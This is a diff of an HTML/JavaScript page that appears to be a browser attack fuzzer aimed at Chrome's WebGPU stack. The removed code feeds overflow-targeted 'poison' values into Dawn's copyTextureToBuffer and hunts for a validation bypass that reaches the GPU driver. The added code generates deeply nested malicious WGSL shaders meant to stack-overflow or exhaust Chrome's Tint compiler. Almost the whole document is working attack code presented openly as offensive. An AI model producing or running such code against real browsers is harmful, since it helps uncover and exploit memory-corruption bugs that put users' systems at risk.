@@ -1,108 +1,88 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>WebGPU V3 Math Breaker</title>
-    <style>body { background: #000; color: #0f0; font-family: monospace; }</style>
+    <title>WebGPU WGSL Compiler Fuzzer</title>
+    <style>body { background: #111; color: #ff00ff; font-family: monospace; font-size: 14px; }</style>
 </head>
 <body>
-    <h2>Hunting the Dawn C++ Overflow</h2>
-    <button id="fuzzBtn" style="padding:15px; background:#f00; color:#fff; font-weight:bold; cursor:pointer;">START V3 FUZZER</button>
+    <h2>Attacking Chrome's Tint Shader Compiler</h2>
+    <button id="fuzzBtn" style="padding:15px; background:#ff00ff; color:#000; font-weight:bold; cursor:pointer;">START WGSL FUZZER</button>
     <pre id="log" style="white-space: pre-wrap; word-wrap: break-word;"></pre>
 
     <script>
         const logEl = document.getElementById('log');
-        function log(msg) { logEl.innerText = msg + '\n' + logEl.innerText.substring(0, 3000); }
+        function log(msg) { logEl.innerText = msg + '\n' + logEl.innerText.substring(0, 1000); }
 
-        // Highly targeted values designed to overflow when multiplied by 3 (depth-1) or bytesPerRow
-        const poisonValues = [
-            1431655765, // (0xFFFFFFFF / 3)
-            1431655766, // (0xFFFFFFFF / 3) + 1 -> OVERFLOWS 32-bit when multiplied by 3!
-            4294967295, // 0xFFFFFFFF
-            4294967296, // 32-bit boundary
-            1073741824, // 0xFFFFFFFF / 4
-            // 64-bit overflow targets (JS numbers lose precision here, but we try)
-            Number.MAX_SAFE_INTEGER
-        ];
+        // Generate deeply nested mathematical operations
+        function generateDeepMath(depth) {
+            if (depth <= 0) return "(1.0)";
+            const ops = ['+', '-', '*', '/'];
+            const op = ops[Math.floor(Math.random() * ops.length)];
+            return `(${generateDeepMath(depth - 1)} ${op} vec4<f32>(vec2<f32>(1.0, 1.0), vec2<f32>(1.0, 1.0)).x)`;
+        }
 
-        function getPoison() {
-            let val = poisonValues[Math.floor(Math.random() * poisonValues.length)];
-            // Slightly jitter the number to hit exact exact boundaries
-            val += Math.floor(Math.random() * 5) - 2; 
-            return Math.abs(val);
+        // Generate deeply nested control flow (if/else/loop)
+        function generateDeepControlFlow(depth) {
+            if (depth <= 0) return `return vec4<f32>(1.0, 0.0, 0.0, 1.0);`;
+            return `
+                if (true) {
+                    loop {
+                        if (false) { break; }
+                        ${generateDeepControlFlow(depth - 1)}
+                    }
+                } else {
+                    ${generateDeepControlFlow(depth - 1)}
+                }
+            `;
+        }
+
+        // Generate the malicious shader string
+        function generateEvilShader() {
+            // Randomly decide whether to attack the math parser or the AST control flow parser
+            const attackType = Math.random();
+            let body = "";
+
+            if (attackType > 0.5) {
+                // Attack 1: Extreme AST depth (causes C++ Stack Overflow in Tint)
+                body = generateDeepControlFlow(Math.floor(Math.random() * 50) + 20);
+            } else {
+                // Attack 2: Extreme Math parsing (causes memory exhaustion or type-confusion)
+                body = `let crazy_var = ${generateDeepMath(Math.floor(Math.random() * 100) + 50)};\n return vec4<f32>(crazy_var, 0.0, 0.0, 1.0);`;
+            }
+
+            return `
+                @vertex fn vs_main() -> @builtin(position) vec4<f32> {
+                    ${body}
+                    return vec4<f32>(0.0,0.0,0.0,1.0);
+                }
+            `;
         }
 
         async function runFuzzer() {
             if (!navigator.gpu) { log("WebGPU not supported!"); return; }
-
             const adapter = await navigator.gpu.requestAdapter();
             const device = await adapter.requestDevice();
-            log("[+] Device acquired. Catching async errors...");
-
-            // Listen for Dawn C++ catching the errors
-            device.addEventListener('uncapturederror', (event) => {
-                // We silently swallow Dawn's validation errors so the fuzzer keeps running
-                // console.log("Dawn caught an error: ", event.error.message);
-            });
-
-            const buffer = device.createBuffer({
-                size: 1024 * 1024 * 16, // 16 MB
-                usage: GPUBufferUsage.COPY_DST | GPUBufferUsage.COPY_SRC
-            });
-
-            const texture = device.createTexture({
-                size: { width: 4, height: 4, depthOrArrayLayers: 4 }, // Fixed Depth!
-                format: 'rgba8unorm',
-                usage: GPUTextureUsage.COPY_SRC | GPUTextureUsage.COPY_DST
-            });
+            log("[+] Device acquired. Spawning Shader Modules...");
 
             let runs = 0;
 
             setInterval(() => {
                 runs++;
-                if(runs % 100 === 0) log(`[+] Executed ${runs} malicious copies...`);
+                if(runs % 10 === 0) log(`[+] Compiled ${runs} malicious shaders...`);
 
-                const encoder = device.createCommandEncoder();
-
-                // 1. Generate aligned bytesPerRow (Must be >= 256)
-                let evilBytesPerRow = getPoison();
-                evilBytesPerRow = (evilBytesPerRow & ~0xFF) >>> 0; 
-                if (evilBytesPerRow === 0) evilBytesPerRow = 256;
-
-                // 2. Generate Rows Per Image (Must be >= 4)
-                let evilRowsPerImage = getPoison();
-                if (evilRowsPerImage < 4) evilRowsPerImage = 4;
-
-                // 3. Push the device error scope (to see if this specific command bypassed Dawn)
-                device.pushErrorScope('validation');
+                const evilWGSL = generateEvilShader();
 
                 try {
-                    encoder.copyTextureToBuffer(
-                        { texture: texture },
-                        { 
-                            buffer: buffer, 
-                            bytesPerRow: evilBytesPerRow, 
-                            rowsPerImage: evilRowsPerImage 
-                        },
-                        { width: 4, height: 4, depthOrArrayLayers: 4 } // Locked Depth!
-                    );
-
-                    device.queue.submit([encoder.finish()]);
-
-                    // Check if Dawn caught it asynchronously
-                    device.popErrorScope().then((error) => {
-                        if (error === null) {
-                            // HOLY GRAIL: If error is null, Dawn's C++ math failed to catch the overflow!
-                            // It was sent directly to the Android GPU driver!
-                            log(`\n[$$$] CRITICAL BYPASS FOUND!`);
-                            log(`[$$$] bpr: ${evilBytesPerRow}, rpi: ${evilRowsPerImage}`);
-                            log(`[$$$] The driver is executing this now... Brace for impact!\n`);
-                        }
+                    // Send the massive string to the C++ Tint Compiler
+                    // This is where Chrome parses the text and builds the AST!
+                    device.createShaderModule({
+                        code: evilWGSL
                     });
-
+                    
                 } catch (e) {
-                    // Blink caught it synchronously (e.g., bytesPerRow not multiple of 256)
+                    // Syntax errors are normal during fuzzing
                 }
-            }, 2); // Run extremely fast
+            }, 10); 
         }
 
         document.getElementById('fuzzBtn').addEventListener('click', runFuzzer);
